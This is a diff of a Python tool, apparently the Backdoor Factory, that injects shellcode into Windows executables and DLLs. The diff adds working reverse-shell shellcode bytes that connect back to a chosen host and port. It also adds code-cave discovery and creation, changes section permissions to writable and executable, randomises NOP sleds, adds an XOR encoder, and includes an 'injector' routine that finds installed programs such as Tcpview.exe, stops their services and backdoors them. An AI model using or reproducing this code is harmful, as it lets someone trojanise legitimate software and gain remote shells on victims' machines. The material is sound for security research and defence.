@@ -23,7 +23,7 @@
     Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
     MA 02110-1301, USA.
 
-    This program current supports win32 EXEs/DLLs only (intel architecture).
+    Currently supports win32 EXEs/DLLs only (intel architecture).
     This program is to be used for only legal activities by IT security
     professionals and researchers.
 
@@ -39,10 +39,8 @@ import signal
 import platform
 import stat
 import time
-
-#setting global variables
-verbose = False
-change_access = True
+from random import choice
+import subprocess
 
 
 def signal_handler(signal, frame):
@@ -63,6 +61,67 @@ MachineTypes = {'0x0': 'AnyMachineType', '0x1d3': 'Matsushita AM33',
                 '0x1c2': 'ARM or Thumb -interworking',
                 '0x169': 'MIPS little-endian WCE v2'
                 }
+
+menu = ["-.(`-')  (`-')  _           <-"
+        ".(`-') _(`-')                            (`-')\n"
+        "__( OO)  (OO ).-/  _         __( OO)"
+        "( (OO ).->     .->        .->   <-.(OO )  \n"
+        "'-'---.\  / ,---.   \-,-----.'-'. ,--"
+        ".\    .'_ (`-')----. (`-')----. ,------,) \n"
+        "| .-. (/  | \ /`.\   |  .--./|  .'   /"
+        "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
+        "| '-' `.) '-'|_.' | /_) (`-')|      /)"
+        "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
+        "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
+        "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
+        "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
+        "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
+        "`------'  `--' `--'   `-----'`--' '--'"
+        "`------'    `-----'    `-----' `--' '--' \n"
+        "           (`-')  _           (`-')     "
+        "              (`-')                    \n"
+        "   <-.     (OO ).-/  _        ( OO).-> "
+        "      .->   <-.(OO )      .->           \n"
+        "(`-')-----./ ,---.   \-,-----./    '._"
+        "  (`-')----. ,------,) ,--.'  ,-.        \n"
+        "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
+        "( OO).-.  '|   /`. '(`-')'.'  /        \n"
+        " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
+        "( _) | |  ||  |_.' |(OO \    /         \n"
+        " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
+        " \|  |)|  ||  .   .' |  /   /)         \n"
+        "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
+        " '  '-'  '|  |\  \  `-/   /`          \n"
+        "   `--'    `--' `--'   `-----'   `--'    "
+        "  `-----' `--' '--'   `--'            \n",
+
+        "__________               "
+        " __       .___                   \n"
+        "\______   \_____    ____ "
+        "|  | __ __| _/____   ___________ \n"
+        " |    |  _/\__  \ _/ ___\|"
+        "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
+        " |    |   \ / __ \\\\  \__"
+        "_|    </ /_/ (  <_> |  <_> )  | \/\n"
+        " |______  /(____  /\___  >"
+        "__|_ \____ |\____/ \____/|__|   \n"
+        "        \/      \/     \/"
+        "     \/    \/                    \n"
+        "___________              "
+        "__                               \n"
+        "\_   _____/____    _____/"
+        "  |_  ___________ ___.__.        \n"
+        " |    __) \__  \ _/ ___\ "
+        "  __\/  _ \_  __ <   |  |        \n"
+        " |     \   / __ \\\\  \__"
+        "_|  | (  <_> )  | \/\___  |        \n"
+        " \___  /  (____  /\___  >_"
+        "_|  \____/|__|   / ____|        \n"
+        "     \/        \/     \/  "
+        "                 \/             \n"]
+
+# I couple NOPs from playing with the debugger
+nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]
 
 #this data block is a mapping of x86 intel (from windows) opcodes and their
 #entire length.  For reconstructing an exe it doesn't matter as much what
@@ -129,7 +188,8 @@ op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
             '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
             '0x5c': 1, '0x5d': 2, '0x5e': 1, '0x5f': 1,
-            '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2, '0x6203': 2,
+            '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
+            '0x6203': 2,
             '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
             '0x6208': 2, '0x6209': 2, '0x6200a': 2, '0x620b': 2,
             '0x620c': 3,
@@ -266,7 +326,7 @@ class Shellcodes():
                 "\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56"
                 "\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
                 "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
-                "\x81\xc4\x00\x02\x00\x00"  # ADD ESP 200 (To align the stack)
+                "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 200 (To align the stack)
                 "\x9d\x61")  # restore the stack
 
         return shellcode
@@ -472,37 +532,37 @@ class Shellcodes():
                 "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
                 "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                 "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
-                "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
-                "\x05\x68")
+                "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
+                "\x68")
         shellcode += self.hostip  # IP
         shellcode += ("\x68\x02\x00")
         shellcode += struct.pack('!h', self.PORT)  # PORT
-        shellcode += ("\x89\xe6\x6a\x10"
-                "\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
-                "\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
-                "\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
-                "\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
-                "\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
-                "\x85\xf6\x75\xec\xc3"  #
-                "\x81\xc4\x00\x02\x00\x00"  # ADD ESP 200 (To align the stack)
-                "\x9d\x61")  # restore the stack
+        shellcode += ("\x89\xe6\x6a\x10\x56"
+                "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
+                "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
+                "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
+                "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
+                #The NOP in the line below allows for continued execution.
+                "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
+                "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
+                "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
+                "\x81\xc4\xfc\x01\x00\x00"  # ADD ESP 1FC (To align the stack)
+                "\x9d\x61")  # restore the stack 
 
         return shellcode
 
 
-
-
 def pe32_entry_instr(TrackingAddress, fileItems):
     """
-    This fuction returns a list called ImpList that tracks the first 
+    This fuction returns a list called ImpList that tracks the first
     couple instructions for reassembly after the shellcode executes.
-    If there are pe entry instructions that are not mapped here, 
+    If there are pe entry instructions that are not mapped here,
     please send me the first 15 bytes (3 to 4 instructions on average)
-    for the executable entry point once loaded in memory.  If you are 
-    familiar with olly/immunity it is the first couple instructions 
+    for the executable entry point once loaded in memory.  If you are
+    familiar with olly/immunity it is the first couple instructions
     when the program is first loaded.
     """
-    
+
     #for i, byte in enumerate(initial_instr_set):
     #    print i, ByteToHex(byte)
     f.seek(fileItems['LocOfEntryinCode'])
@@ -536,7 +596,8 @@ def pe32_entry_instr(TrackingAddress, fileItems):
                 instr_length = op_codes[hex(CurrInstr)] - i
                 #print "instr_length",instr_length
                 if instr_length == 5:
-                    InstrSets[CurrInstr] = struct.unpack('<BBBBB', f.read(5))[0]
+                    InstrSets[CurrInstr] = (struct.unpack('<BBBBB',
+                                            f.read(5))[0])
                 if instr_length == 4:
                     InstrSets[CurrInstr] = struct.unpack('<I', f.read(4))[0]
                 if instr_length == 3:
@@ -673,7 +734,7 @@ def resume_execution_32(ImpList):
             resumeExe += "\x25"          # To zero eax
             resumeExe += compliment_two  #
             resumeExe += "\x05"  # ADD
-            print ImpValue
+            #print ImpValue
             if ImpValue > 429467295:
                 resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
             else:
@@ -816,37 +877,37 @@ def gather_file_info(filename, backdoorfile):
                               fileItems['dis_frm_pehdrs_sectble'] +
                               40*fileItems['NumberOfSections'])
     f.seek(fileItems['OldIATLoc'])
-    priorIMTLoc=0
-    IATexists=False
+    priorIMTLoc = 0
+    IATexists = False
     while True:
-        IMTsize=struct.unpack('<i', f.read(4))[0]
-        IMTlocation=struct.unpack('<i', f.read(4))[0]
+        IMTsize = struct.unpack('<i', f.read(4))[0]
+        IMTlocation = struct.unpack('<i', f.read(4))[0]
         #print 'Size', IMTsize, 'Location',IMTlocation
         if IMTsize == 0 and IMTlocation == 0:
             break
-        priorIMTLoc=IMTlocation
-        IATexists=True
+        priorIMTLoc = IMTlocation
+        IATexists = True
     #print 'priorIMTLOC', priorIMTLoc, 'OldIATLoc', fileItems['OldIATLoc']
     f.seek(priorIMTLoc+fileItems['OldIATLoc'], 0)
-    IATcount=0
-    test=''
+    IATcount = 0
+    test = ''
     while True:
-        if IATexists == False:
+        if IATexists is False:
             break
         #print 'length test',len(test)
         test += str(f.read(1))
         if len(test) > 3:
-            test=test[1:]
+            test = test[1:]
         #print test
-        IATcount=IATcount+1
+        IATcount = IATcount + 1
         if test.lower() == "dll":
             break
     #print 'IATcount' ,IATcount
-    fileItems['SizeOfIAT']=priorIMTLoc+IATcount
+    fileItems['SizeOfIAT'] = priorIMTLoc+IATcount
     f.seek(fileItems['OldIATLoc'])
-    fileItems['ImportTableALL']=f.read(fileItems['SizeOfIAT'])
+    fileItems['ImportTableALL'] = f.read(fileItems['SizeOfIAT'])
     #print fileItems['SizeOfIAT']
-    fileItems['NewIATLoc']=fileItems['OldIATLoc']+40
+    fileItems['NewIATLoc'] = fileItems['OldIATLoc'] + 40
 
     f.close()
 
@@ -857,17 +918,17 @@ def change_section_flags(fileItems, section):
     """
     Changes the user selected section to RWE for successful execution
     """
-    fileItems['newSectionFlags']=int('e00000e0', 16)
+    fileItems['newSectionFlags'] = int('e00000e0', 16)
     f.seek(fileItems['pe_header_location'] +
-           fileItems['dis_frm_pehdrs_sectble'],0)
+           fileItems['dis_frm_pehdrs_sectble'], 0)
     for _ in range(fileItems['NumberOfSections']):
-        sec_name=f.read(8)
+        sec_name = f.read(8)
         if section in sec_name:
-            f.seek(28,1)
+            f.seek(28, 1)
             f.write(struct.pack('<I', fileItems['newSectionFlags']))
             return
         else:
-            f.seek(32,1)
+            f.seek(32, 1)
 
 
 def create_code_cave(fileItems, shellcode, nsection):
@@ -876,45 +937,58 @@ def create_code_cave(fileItems, shellcode, nsection):
     takes in the dict from gather_file_info function and
     writes to the file and returns fileItems
     """
-    fileItems['NewSectionSize']=len(shellcode) + 250 #bytes
+    fileItems['NewSectionSize'] = len(shellcode) + 250  # bytes
     fileItems['SectionName'] = nsection  # less than 7 chars
-    fileItems['filesize']=os.stat(fileItems['filename']).st_size #starts at 1, place to write to file
-    fileItems['newSectionPointerToRawData']=fileItems['filesize']
-    fileItems['VirtualSize']=int(str(fileItems['NewSectionSize']), 16)
-    fileItems['SizeOfRawData']=fileItems['VirtualSize']
-    fileItems['NewSectionName']="."+fileItems['SectionName']
-    fileItems['newSectionFlags']=int('e00000e0', 16)
+    # starts at 1, place to write to file
+    fileItems['filesize'] = os.stat(fileItems['filename']).st_size
+    fileItems['newSectionPointerToRawData'] = fileItems['filesize']
+    fileItems['VirtualSize'] = int(str(fileItems['NewSectionSize']), 16)
+    fileItems['SizeOfRawData'] = fileItems['VirtualSize']
+    fileItems['NewSectionName'] = "." + fileItems['SectionName']
+    fileItems['newSectionFlags'] = int('e00000e0', 16)
     f.seek(fileItems['pe_header_location']+6, 0)
     f.write(struct.pack('<h', fileItems['NumberOfSections']+1))
     f.seek(16+28+28, 1)
-    fileItems['NewSizeOfImage']=fileItems['VirtualSize']+fileItems['SizeOfImage']
+    fileItems['NewSizeOfImage'] = (fileItems['VirtualSize'] +
+                                   fileItems['SizeOfImage'])
     f.write(struct.pack('<i', fileItems['NewSizeOfImage']))
     f.seek(fileItems['ImportTableLocation'])
     if fileItems['IATLocInCode'] != 0:
         f.write(struct.pack('=i', fileItems['IATLocInCode']+40))
-    f.seek(fileItems['pe_header_location']+fileItems['dis_frm_pehdrs_sectble']+40*fileItems['NumberOfSections'], 0)
-    f.write(fileItems['NewSectionName']+"\x00"*(8-len(fileItems['NewSectionName'])))
+    f.seek(fileItems['pe_header_location'] +
+           fileItems['dis_frm_pehdrs_sectble'] +
+           40*fileItems['NumberOfSections'], 0)
+    f.write(fileItems['NewSectionName'] +
+            "\x00"*(8-len(fileItems['NewSectionName'])))
     f.write(struct.pack('<i', fileItems['VirtualSize']))
     f.write(struct.pack('<i', fileItems['SizeOfImage']))
     f.write(struct.pack('<i', fileItems['SizeOfRawData']))
-    f.write(struct.pack('<i', fileItems['newSectionPointerToRawData'])) #Also CodeCave
-    if verbose == True:
-        print 'New Section PointerToRawData',fileItems['newSectionPointerToRawData']
+    # Also CodeCave
+    f.write(struct.pack('<i', fileItems['newSectionPointerToRawData']))
+    if verbose is True:
+        print 'New Section PointerToRawData'
+        print fileItems['newSectionPointerToRawData']
     f.write(struct.pack('<i', 0))
     f.write(struct.pack('<i', 0))
     f.write(struct.pack('<i', 0))
     f.write(struct.pack('<I', fileItems['newSectionFlags']))
     f.write(fileItems['ImportTableALL'])
-    f.seek(fileItems['filesize']+1, 0) #moving to end of file
-    #two different types of nops/randomize this
-    if random.randint(0,1) == 0:
-        f.write("\x90"*(fileItems['VirtualSize']))
+    f.seek(fileItems['filesize']+1, 0)  # moving to end of file
+    # two different types of nops/randomize this
+    nop = choice(nops)
+    if nop > 144:
+        f.write(struct.pack('!H', nop) * (fileItems['VirtualSize']/2))
     else:
-        f.write("\x66\x90"*(fileItems['VirtualSize']/2))
-    fileItems['CodeCaveVirtualAddress']=fileItems['SizeOfImage']+fileItems['ImageBase']
-    #This is to jump over lingering certificates that bleed into the new section 
-    fileItems['buffer']=int('200', 16) #bytes
-    fileItems['JMPtoCodeAddress']=fileItems['CodeCaveVirtualAddress']-fileItems['AddressOfEntryPoint']-fileItems['ImageBase']-5+fileItems['buffer']
+        f.write(struct.pack('!B', nop) * (fileItems['VirtualSize']))
+    fileItems['CodeCaveVirtualAddress'] = (fileItems['SizeOfImage'] +
+                                           fileItems['ImageBase'])
+    # This is to jump over certificates
+    # that could bleed into the new section
+    fileItems['buffer'] = int('200', 16)  # bytes
+    fileItems['JMPtoCodeAddress'] = (fileItems['CodeCaveVirtualAddress'] -
+                                     fileItems['AddressOfEntryPoint'] -
+                                     fileItems['ImageBase'] - 5 +
+                                     fileItems['buffer'])
     return fileItems
 
 
@@ -924,46 +998,48 @@ def find_all_caves(fileItems, shellcode_length):
     Prints results to screen
     """
     SIZE_CAVE_TO_FIND = shellcode_length
-    Tracking=0
-    count=0
-    caveTracker=[]
-    caveSpecs=[]
+    Tracking = 0
+    count = 0
+    caveTracker = []
+    caveSpecs = []
     #finds all caves over 100 or whatever you want
     #statinfo = os.stat(fileItems['filename'])
     #print statinfo.st_size
     f.seek(0)
     while True:
         try:
-            s=struct.unpack("<b", f.read(1))[0]
+            s = struct.unpack("<b", f.read(1))[0]
         except:
             #print s
             #print "EOF"
             break
         if s == 0:
-            if count==0:
-                BeginCave=Tracking
+            if count == 0:
+                BeginCave = Tracking
             elif count == 100:
                 caveSpecs.append(BeginCave)
-            count+=1
+            count += 1
         else:
             if count >= SIZE_CAVE_TO_FIND:
                 caveSpecs.append(Tracking)
                 caveTracker.append(caveSpecs)
-            count=0
-            caveSpecs=[]
-        
-        Tracking+=1
+            count = 0
+            caveSpecs = []
 
-    #print caveTracker
+        Tracking += 1
+
+    # print caveTracker
     for caves in caveTracker:
-        
-        countOfSections=0;
+
+        countOfSections = 0
         for section in fileItems['Sections']:
-            sectionFound=False
-            #print section[0]
-            #print section[3] + section[4]
-            if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
-                caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:# and '.text' in section[0]:
+            sectionFound = False
+            # print section[0]
+            # print section[3] + section[4]
+            if caves[0] >= section[4] and \
+               caves[1] <= (section[3] + section[4]) and \
+               caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
+               # and '.text' in section[0]:
                 #if verbose == True:
                 #    #print "test"
                 print "We have a winner:", section[0]
@@ -973,12 +1049,14 @@ def find_all_caves(fileItems, shellcode_length):
                 print 'SizeOfRawData', hex(section[3])
                 print 'PointerToRawData', hex(section[4])
                 print 'End of Raw Data:', hex(section[3]+section[4])
-                JMPtoCodeAddress= section[2]+caves[0]-section[4] -5 -fileItems['AddressOfEntryPoint']
+                JMPtoCodeAddress = (section[2] + caves[0] -
+                                    section[4] - 5 -
+                                    fileItems['AddressOfEntryPoint'])
                 #print "JMPtoCodeAddress", JMPtoCodeAddress, caves[0]
                 print '*'*50
-                sectionFound=True
+                sectionFound = True
                 break
-        if sectionFound==False:    
+        if sectionFound is False:
             try:
                 print "No section"
                 print '->Begin Cave', hex(caves[0])
@@ -992,90 +1070,101 @@ def find_all_caves(fileItems, shellcode_length):
 def find_cave(fileItems, shellcode_length):
     """This function finds all code caves, allowing the user
     to pick the cave for injecting shellcode."""
-    
+
     SIZE_CAVE_TO_FIND = shellcode_length
-    Tracking=0
-    count=0
-    caveTracker=[]
-    caveSpecs=[]
+    Tracking = 0
+    count = 0
+    caveTracker = []
+    caveSpecs = []
     #finds all caves over 100 or whatever you want
     #statinfo = os.stat(fileItems['filename'])
     #print statinfo.st_size
     f.seek(0)
     while True:
         try:
-            s=struct.unpack("<b", f.read(1))[0]
+            s = struct.unpack("<b", f.read(1))[0]
         except:
             #print s
             #print "EOF"
             break
         if s == 0:
-            if count==0:
-                BeginCave=Tracking
+            if count == 0:
+                BeginCave = Tracking
             elif count == 100:
                 caveSpecs.append(BeginCave)
-            count+=1
+            count += 1
         else:
             if count >= SIZE_CAVE_TO_FIND:
                 caveSpecs.append(Tracking)
                 caveTracker.append(caveSpecs)
-            count=0
-            caveSpecs=[]
-        
-        Tracking+=1
-    
-    pickACave={}
-    
+            count = 0
+            caveSpecs = []
+
+        Tracking += 1
+
+    pickACave = {}
+
     for i, caves in enumerate(caveTracker):
-        i+=1
+        i += 1
         #print i
-        countOfSections=0;
+        countOfSections = 0
         for section in fileItems['Sections']:
-            sectionFound=False
+            sectionFound = False
             #print section[0]
             #print section[3] + section[4]
-            #rdata section has been giving me trouble, so lets not use that section.
-            if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
-                caves[1] - caves[0] >= SIZE_CAVE_TO_FIND: 
-                if verbose == True:
-                    print "We have a winner, inserting code in the following section:", section[0]
+            if caves[0] >= section[4] and \
+               caves[1] <= (section[3] + section[4]) and \
+               caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
+                if verbose is True:
+                    print "Inserting code in this section:", section[0]
                     print '->Begin Cave', hex(caves[0])
                     print '->End of Cave', hex(caves[1])
                     print 'Size of Cave (int)', caves[1] - caves[0]
                     print 'SizeOfRawData', hex(section[3])
                     print 'PointerToRawData', hex(section[4])
-                    print 'End of Raw Data:', hex(section[3]+section[4])
+                    print 'End of Raw Data:', hex(section[3] + section[4])
                     print '*'*50
-                JMPtoCodeAddress= section[2]+caves[0]-section[4] -5 -fileItems['AddressOfEntryPoint']
+                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
+                                    5 - fileItems['AddressOfEntryPoint'])
                 #print "JMPtoCodeAddress", JMPtoCodeAddress, caves[0]
-                
-                sectionFound=True
-                #structure:SectionName, cave begin, cave end, cave size, section begin, section end,
+
+                sectionFound = True
+                # structure:(SectionName, cave begin, cave end, cave size,
+                #            section begin, section end, JMPtoCodeAddress)
                 #JMP location if picked
-                pickACave[i]=[section[0], hex(caves[0]), hex(caves[1]), caves[1] - caves[0], hex(section[4]), 
-                            hex(section[3]+section[4]), JMPtoCodeAddress ]
+                pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
+                                caves[1] - caves[0], hex(section[4]),
+                                hex(section[3]+section[4]), JMPtoCodeAddress]
                 #return JMPtoCodeAddress, caves[0]
                 break
-        if sectionFound==False: 
-            #because injecting in lonely caves is fun too ;)
-            if verbose == True:   
+        if sectionFound is False:
+            if verbose is True:
                 print "No section"
                 print '->Begin Cave', hex(caves[0])
                 print '->End of Cave', hex(caves[1])
                 print 'Size of Cave (int)', caves[1] - caves[0]
                 print '*'*50
-            
-            JMPtoCodeAddress= section[2] + caves[0] - section[4] - 5 - fileItems['AddressOfEntryPoint']
-            pickACave[i]=["None", hex(caves[0]), hex(caves[1]), caves[1] - caves[0], "None",
-                          "None"  , JMPtoCodeAddress ]
-    
-    print "The following caves can be used to inject code and possibly continue execution"
-    print "use a number greater than the highest reference to add a code cave to the executable/dll"
-    print "versus using an existing code cave.. Good luck:"
+
+            JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
+                                5 - fileItems['AddressOfEntryPoint'])
+            pickACave[i] = ["None", hex(caves[0]), hex(caves[1]),
+                            caves[1] - caves[0], "None",
+                            "None", JMPtoCodeAddress]
+
+    print ("############################################################\n"
+           "The following caves can be used to inject code and possibly\n"
+           "continue execution. Use a number greater than the highest\n"
+           "reference to append a code cave to the executable/dll versus\n"
+           "using an existing code cave.\n"
+           "Good luck:\n"
+           "############################################################")
     for ref, details in pickACave.iteritems():
-        print ref, """Section Name: {0}; Section Begin: {4} End: {5}; Cave begin: {1} End: {2}; Cave Size: {3}""".format(
-                    details[0], details[1], details[2], details[3], details[4], details[5], details[6]) 
-    
+        print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
+                               "End: {5}; Cave begin: {1} End: {2}; "
+                               "Cave Size: {3}".format(
+                               details[0], details[1], details[2],
+                               details[3], details[4], details[5],
+                               details[6]))
     while True:
         selection = raw_input("Enter your selection:")
         try:
@@ -1083,30 +1172,34 @@ def find_cave(fileItems, shellcode_length):
             print "Using selection: %s" % selection
             #returning JMPtoCodeAddress, cave[0]
             try:
-                if change_access == True:
+                if change_access is True:
                     if pickACave[selection][0] != "None":
-                        change_section_flags(fileItems, pickACave[selection][0])
-                return int(pickACave[selection][6]), int(pickACave[selection][1], 16)
+                        change_section_flags(fileItems,
+                                             pickACave[selection][0])
+                return (int(pickACave[selection][6]),
+                        int(pickACave[selection][1], 16))
             except Exception as e:
                 print str(e)
                 print "Appending a code cave"
                 return None, None
         except Exception as e:
             print str(e)
-    
 
-def do_thebackdoor(filename, backdoorfile, shellcode, nsection, NewCodeCave=False, encoder="none"):
+
+def do_thebackdoor(filename, backdoorfile, shellcode,
+                   nsection, NewCodeCave=False, encoder="none"):
     """
     This function operates the sequence of all involved
-    functions to perform the backdoor. 
+    functions to perform the backdoor.
     """
     global fileItems
     fileItems = gather_file_info(filename, backdoorfile)
-    fileItems['NewCodeCave']=NewCodeCave
+    fileItems['NewCodeCave'] = NewCodeCave
     if MachineTypes[hex(fileItems['MachineType'])] != "Intel x86":
         for item in fileItems:
             print item+':', fileItems[item]
-        print "This program does not support this format: %s" % MachineTypes[hex(fileItems['MachineType'])]
+        print ("This program does not support this format: %s"
+               % MachineTypes[hex(fileItems['MachineType'])])
         return None
 
     #Creating file to backdoor
@@ -1118,19 +1211,21 @@ def do_thebackdoor(filename, backdoorfile, shellcode, nsection, NewCodeCave=Fals
         shellcode_length = len(shellcode) + 65
     else:
         shellcode_length = len(set_encoder(encoder, shellcode)) + 65
-    
-    if fileItems['NewCodeCave'] == False:
-        fileItems['JMPtoCodeAddress'], fileItems['CodeCaveLOC'] = find_cave(fileItems, shellcode_length)
+
+    if fileItems['NewCodeCave'] is False:
+        fileItems['JMPtoCodeAddress'], fileItems['CodeCaveLOC'] = (
+            find_cave(fileItems, shellcode_length))
     else:
         fileItems['JMPtoCodeAddress'] = None
 
     global ImpList
-    ImpList, count_bytes = pe32_entry_instr(fileItems['VirtualStartingPoint'], fileItems)
-    
+    ImpList, count_bytes = pe32_entry_instr(fileItems['VirtualStartingPoint'],
+                                            fileItems)
+
     #If you didn't find a cave, continue to create one.
-    if fileItems['JMPtoCodeAddress'] == None:
+    if fileItems['JMPtoCodeAddress'] is None:
         fileItems = create_code_cave(fileItems, shellcode, nsection)
-        fileItems['NewCodeCave']=True
+        fileItems['NewCodeCave'] = True
         print "Adding a new section to the exe/dll for shellcode injection"
     #Patch the entry point
     patch_initial_instructions(fileItems, ImpList, count_bytes)
@@ -1140,14 +1235,15 @@ def do_thebackdoor(filename, backdoorfile, shellcode, nsection, NewCodeCave=Fals
     if encoder.lower() != "none":
         completeShellcode = set_encoder(encoder, completeShellcode)
     #print "length complete shellcode", len(completeShellcode)
-        
+
     #write instructions and shellcode
-    if fileItems['NewCodeCave'] == True:
+    if fileItems['NewCodeCave'] is True:
         f.seek(fileItems['newSectionPointerToRawData']+fileItems['buffer'])
-    else: f.seek(fileItems['CodeCaveLOC'])
+    else:
+        f.seek(fileItems['CodeCaveLOC'])
     f.write(completeShellcode)
 
-    if verbose == True:
+    if verbose is True:
         for item in fileItems:
             print item+':', fileItems[item]
         print "ImpList"
@@ -1163,10 +1259,11 @@ def output_options(input_file, output_file=""):
     Output file check.
     """
     if not output_file:
-        output_file = "bd."+ os.path.basename(input_file)
+        output_file = "bd." + os.path.basename(input_file)
     return output_file
         #parser.error("You must provide an output file.")
         #sys.exit(1)
+
 
 def set_encoder(ENCODER, SHELL):
     """
@@ -1179,7 +1276,8 @@ def set_encoder(ENCODER, SHELL):
         for item in dir(Encoders):
             if "__" in item:
                 continue
-            else: print "   {0}".format(item)
+            else:
+                print "   {0}".format(item)
         parser.print_help()
         sys.exit()
 
@@ -1189,7 +1287,8 @@ def set_encoder(ENCODER, SHELL):
             #print item
             if "__" in item:
                 continue
-            else: print "   {0}".format(item)
+            else:
+                print "   {0}".format(item)
         sys.exit()
 
     #Init the encoder class
@@ -1198,13 +1297,14 @@ def set_encoder(ENCODER, SHELL):
     if ENCODER == "encode_xor":
         shellcode = encoded_shell.encode_xor()
 
-    #Update below:    
+    #Update below:
     #EXAMPLE
     #if ENCODER == "custom_shellcode":
     #   shellcode = encoded_shell.custom_shellcode()
     #
-    
+
     return shellcode
+
 
 def set_shells(SHELL, PORT, HOST=""):
     """
@@ -1217,7 +1317,8 @@ def set_shells(SHELL, PORT, HOST=""):
         for item in dir(Shellcodes):
             if "__" in item:
                 continue
-            else: print "   {0}".format(item)
+            else:
+                print "   {0}".format(item)
         parser.print_help()
         sys.exit()
 
@@ -1227,11 +1328,12 @@ def set_shells(SHELL, PORT, HOST=""):
             #print item
             if "__" in item:
                 continue
-            else: print "   {0}".format(item)
+            else:
+                print "   {0}".format(item)
         sys.exit()
 
     shells = Shellcodes(HOST, PORT)
-           
+
     if SHELL == "reverse_shell_tcp":
         if PORT:
             shellcode = shells.reverse_shell_tcp()
@@ -1257,31 +1359,33 @@ def set_shells(SHELL, PORT, HOST=""):
     return shellcode
 
 
-def injector(suffix, change_Access, 
-             SHELL, encoder, host,
-             port, nsection, add_section,
-             verbose):
-    #add settings to input.. not hard coded
-    #SETTINGS AREA get rid of 
-    kill=False
-    #or set encoder to None
-    #features:
-    #if backdoor fails add a delete old, or a restore
-    #add a restore function
-    #add old file delete
-    #add maybe target import
-    #SETTINGS AREA
-    #Data format DICT: {process_name_to_backdoor : [('dependencies to kill', ), 'service to kill', restart=True/False],}
-    list_of_targets = {
-                        #'nc.exe':[('nc.exe', ), None, False] , 
-                        'hamachi-2.exe': [('hamachi-2.exe', ), "Hamachi2Svc", True],
-                        #'Tcpview.exe':[('Tcpview.exe',), None, False],
-                        #'rpcapd.exe':[('rpcapd.exe'), None, False],
-                        #'psexec.exe':[('psexec.exe,'), None, False],
-                        'vncserver.exe':[('vncserver.exe', ), 'vncserver', True],
-                        #'vmtoolsd.exe':[('vmtools.exe',), 'VMTools', True], #must append code cave
-                        #'TeamViewer_Service.exe':[('TeamViewer_Service.exe',), 'TeamViewer8', True]
-                        #add putty
+def injector(suffix, change_Access, SHELL, encoder, host,
+             port, nsection, add_section, verbose):
+    """
+    The injector module will hunt and injection shellcode into
+    targets that are in the list_of_targets dict.
+    Data format DICT: {process_name_to_backdoor :
+                       [('dependencies to kill', ),
+                       'service to kill', restart=True/False],
+                       }
+    """
+    kill = False
+
+    #add putty
+    list_of_targets = {#'hamachi-2.exe':
+                       #[('hamachi-2.exe', ), "Hamachi2Svc", True],
+                       'Tcpview.exe':
+                       [('Tcpview.exe',), None, True],
+                       #'rpcapd.exe':
+                       #[('rpcapd.exe'), None, False],
+                       #'psexec.exe':
+                       #[('psexec.exe,'), None, False],
+                       #'vncserver.exe':
+                       #[('vncserver.exe', ), 'vncserver', True],
+                       # must append code cave for vmtoolsd.exe
+                       #'vmtoolsd.exe':
+                       #[('vmtools.exe',), 'VMTools', True],
